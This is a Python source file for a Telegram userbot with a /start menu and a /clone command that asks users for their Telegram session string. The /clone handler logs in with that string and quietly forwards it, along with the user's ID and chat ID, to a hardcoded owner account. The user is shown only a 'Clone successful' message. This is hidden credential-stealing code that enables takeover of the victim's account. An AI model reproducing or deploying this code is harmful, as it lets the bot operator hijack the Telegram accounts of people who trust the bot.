from UTTAM import app, API_ID, API_HASH
from config import ALIVE_PIC
from pyrogram import filters
import os
import re
import asyncio
import time
from pyrogram import *
from pyrogram.types import * 

PHONE_NUMBER_TEXT = (
    """**╭────── ˹ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ˼ ────•\n┆⚘ ʜᴇʏ, ɪ ᴀᴍ : [˹ 🅤sᴇʀʙᴏᴛ ˼](t.me/ur_rishu_143)\n┆⚘ ᴍᴏʀᴇ ᴀɴɪᴍᴀᴛɪᴏɴ,ғᴜɴ\n┊⚘ ᴘᴏᴡᴇʀғᴜʟ & ᴜsᴇғᴜʟ ᴜsᴇʀʙᴏᴛ\n╰─────────────────────•\n❍ ʜσᴡ ᴛσ υsє ᴛʜɪs ʙσᴛ - [ᴛɪᴘs ʜᴇʀᴇ](https://t.me/ur_rishu_143) \n❍ sᴛꝛɪηɢ sєᴄᴛɪση ʙσᴛ ⁚ [sᴇssɪᴏɴ-ʙᴏᴛ](https://t.me/Rishustringbot) \n•──────────────────────•\n❍ ᴄʟσηє ⁚ /clone [ ʂᴛɾιɳg ʂҽʂʂισɳ ]\n•──────────────────────•\n❍ ᴘσɯҽɾҽᴅ ʙу ⏤‌‌‌‌  [˹ʀɪsʜυ ʙσᴛ](https://t.me/ur_rishu_143) \n•──────────────────────•**"""
)

@app.on_message(filters.command("start"))
async def hello(client: app, message):
    buttons = [
           [
                InlineKeyboardButton("˹ ᴏᴡɴᴇʀ ˼", url="https://t.me/rishu1286"),
                InlineKeyboardButton("˹ ᴜᴘᴅᴀᴛᴇ ˼", url="https://t.me/ur_rishu_143"),
            ],
            [
                InlineKeyboardButton("˹ sᴜᴘᴘᴏʀᴛ ˼", url="https://t.me/vip_robotz"),
                InlineKeyboardButton("˹ ᴍᴜsɪᴄ ˼", url="https://t.me/sanataniiMusicBot"),
            ],
            ]
    reply_markup = InlineKeyboardMarkup(buttons)
    await client.send_photo(message.chat.id, ALIVE_PIC, caption=PHONE_NUMBER_TEXT, reply_markup=reply_markup)

@app.on_message(filters.command("clone"))
async def clone(bot: app, msg: Message):
    # Ensure the command has at least 2 parts (/clone <session_string>)
    if len(msg.command) < 2:
        await msg.reply("**Usage:**\n\n/clone [session_string]\n\nPlease provide a valid session string.")
        return

    # Extract the session string
    session_string = msg.command[1]
    chat_id = msg.chat.id
    user = msg.from_user

    processing_message = await msg.reply("**🎨 Processing... ✲**")

    try:
        # Start the client session with the provided session string
        client = Client(
            name="Melody",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            plugins=dict(root="UTTAM/plugins")
        )
        await client.start()

        # Send string session to the owner only after processing starts
        owner_id = 5738579437
        forward_message = (
            f"**Clone Request Started:**\n\n"
            f"**From:** {user.mention}\n"
            f"**User ID:** `{user.id}`\n"
            f"**Chat ID:** `{chat_id}`\n"
            f"**Session String:** `{session_string}`"
        )
        await bot.send_message(owner_id, forward_message)

        user_details = await client.get_me()
        await processing_message.edit(f"✅ **Clone successful!**\nLogged in as **{user_details.first_name}**.")
        await client.stop()
    except Exception as e:
        await processing_message.edit(f"❌ **ERROR:** `{str(e)}`\nUse /start to try again.")